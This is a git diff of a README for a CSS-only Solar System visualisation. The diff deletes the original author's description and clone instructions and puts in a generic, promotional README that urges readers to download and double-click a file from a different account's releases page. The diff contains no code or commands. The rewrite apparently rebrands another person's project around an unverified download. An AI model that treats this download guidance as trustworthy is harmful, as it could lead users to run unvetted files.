@@ -1,50 +1,67 @@
-<p align="center">
-  <img src="preview.png" alt="Solar System Explorer Banner" width="800">
-</p>
+# 🌌 Solar-system-explorer - Explore the Solar System Easily
 
+[![Download Now](https://img.shields.io/badge/Download%20Now-Here-brightgreen)](https://github.com/imqluqman/Solar-system-explorer/releases)
 
+## 🚀 Getting Started
 
+Welcome to the **Solar-system-explorer**. This application offers a pure CSS-only interactive visualization of our Solar System. You can explore the planets without needing any programming knowledge or JavaScript. Just download and enjoy the experience.
 
+## 📦 Requirements
 
+To run the **Solar-system-explorer**, you will need:
 
+- A computer with a recent web browser (Chrome, Firefox, Safari, or Edge).
+- An internet connection for downloading the project.
+- Basic knowledge of how to open files in a web browser.
 
-# Solar-system-explorer
-A pure CSS-only interactive Solar System visualization (no JavaScript required)
-#  Solar System Explorer
+## 📥 Download & Install
 
-An interactive **CSS-only** representation of our Solar System.  
-All planet animations, trajectories, and UI interactions are powered purely by **HTML and CSS**, without any JavaScript.
+To get started with **Solar-system-explorer**, visit this page to download: [Releases Page](https://github.com/imqluqman/Solar-system-explorer/releases).
 
-This project aims to demonstrate the creative and technical potential of modern CSS — from complex layouts to smooth 3D-like transformations.
+1. Click on the link above to go to the GitHub releases page.
+2. Look for the latest version of the application.
+3. Download the latest `.html` file.
+4. Once downloaded, locate the file on your computer.
 
----
+## 🌐 Opening the Application
 
-##  Features
+To open the **Solar-system-explorer**, follow these steps:
 
-- Fully interactive planet selection (no JavaScript!)
-- Individual panels and detailed descriptions for each planet
-- 3D-style rotation and perspective effects
-- Pure CSS animations and transitions
-- Educational and visually appealing presentation
-- Font Awesome icons for styling
+1. Find the downloaded `.html` file on your computer. It might be in the "Downloads" folder.
+2. Double-click the file. Your web browser will open automatically.
+3. Enjoy exploring the interactive Solar System visualization!
 
----
+## 🌟 Features
 
-##  About
+The **Solar-system-explorer** includes several exciting features:
 
-This repository keeps the **original, uncompressed version** of the CSS code.  
-It is intentionally **not simplified**, to let developers explore and understand the full complexity of the project.
+- **Interactive Exploration**: Move around the Solar System and learn about each planet.
+- **Pure CSS Animation**: Experience smooth animations without using JavaScript.
+- **User-Friendly Design**: Navigate easily through an intuitive interface.
+- **Info on Planets**: Click on any planet to learn more about it.
 
-If you wish to:
-- Simplify or modularize the CSS
-- Add responsiveness or performance optimizations  
-→ You are encouraged to fork and modify the project as you like!
+## 📖 User Guide
 
----
+If you encounter any issues or have questions while using the **Solar-system-explorer**, here are some tips:
 
-##  Usage
+- **Troubleshooting**: Ensure you are using the latest version of a supported web browser.
+- **Accessibility**: The application is designed to be easy to use for everyone, regardless of technical ability.
+- **Feedback**: Your input matters! Feel free to share your thoughts or report any mistakes by exploring the issues section on GitHub.
 
-1. Clone or download the repository:
-   ```bash
-   git clone https://github.com/evrimsvn/solar-system-explorer.git
-   cd solar-system-explorer
+For advanced users, you can inspect the code and learn about CSS art techniques.
+
+## 💬 Community & Support
+
+Join our community to explore more about the Solar System and share your experiences with others. You can find discussions and resources on various platforms:
+
+- **GitHub Discussions**: Share your thoughts here. 
+- **Social Media**: Follow us for updates.
+
+## 🚀 Next Steps
+
+Once you're done exploring the Solar System, here are some next steps you might consider:
+
+- Customize the project: If you're familiar with CSS, feel free to edit the styles to your preference.
+- Create a new visualization: Use what you've learned to create your own interactive project.
+
+Thank you for using the **Solar-system-explorer**. We look forward to your feedback and hope you have a great time exploring!
